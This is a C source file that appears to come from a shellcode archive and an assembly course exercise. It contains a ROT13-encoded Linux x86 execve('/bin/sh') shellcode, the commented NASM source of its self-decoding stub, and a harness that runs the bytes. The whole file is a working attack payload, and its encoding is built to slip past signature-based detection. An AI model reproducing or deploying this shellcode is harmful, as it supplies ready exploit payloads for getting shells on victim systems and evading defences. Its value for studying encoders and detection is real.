/*
 *  Linux x86 - ROT13 encoded execve("/bin/sh") - 68 bytes
 *  Author: xmgv
 *  Details: https://xmgv.wordpress.com/2015/03/04/slae-4-custom-shellcode-encoder/
 */

/*
global _start

section .text

_start:
    jmp short call_decoder

decoder:
    pop esi                     ; shellcode address
    xor ecx, ecx                ; zero out ecx
    mov cl, len                 ; initialize counter

decode:
    cmp byte [esi], 0xD         ; can we substract 13?
    jl wrap_around              ; nope, we need to wrap around
    sub byte [esi], 0xD         ; substract 13
    jmp short process_shellcode ; process the rest of the shellcode

wrap_around:
    xor edx, edx                ; zero out edx
    mov dl, 0xD                 ; edx = 13
    sub dl, byte [esi]          ; 13 - shellcode byte value
    xor ebx,ebx                 ; zero out ebx
    mov bl, 0xff                ; store 0x100 without introducing null bytes
    inc ebx
    sub bx, dx                  ; 256 - (13 - shellcode byte value)
    mov byte [esi], bl          ; write decoded value

process_shellcode:
    inc esi                     ; move to the next byte
    loop decode                 ; decode current byte
    jmp short shellcode         ; execute decoded shellcode

call_decoder:
    call decoder
    shellcode:
        db 0x3e,0xcd,0x5d,0x75,0x3c,0x3c,0x80,0x75,0x75,0x3c,0x6f,0x76,0x7b
        db 0x96,0xf0,0x5d,0x96,0xef,0x60,0x96,0xee,0xbd,0x18,0xda,0x8d
    len: equ $-shellcode
*/

#include <stdio.h>
#include <string.h>

unsigned char code[] =
// Decoder stub:
"\xeb\x24\x5e\x31\xc9\xb1\x19\x80\x3e\x0d\x7c\x05\x80\x2e\x0d\xeb\x10\x31\xd2"
"\xb2\x0d\x2a\x16\x31\xdb\xb3\xff\x43\x66\x29\xd3\x88\x1e\x46\xe2\xe3\xeb\x05"
"\xe8\xd7\xff\xff\xff"
// Encoded shellcode:
"\x3e\xcd\x5d\x75\x3c\x3c\x80\x75\x75\x3c\x6f\x76\x7b\x96\xf0\x5d\x96\xef\x60"
"\x96\xee\xbd\x18\xda\x8d";

int main(void) {
    printf("Shellcode Length:  %d\n", strlen(code));
    int (*ret)() = (int(*)())code;
    ret();
}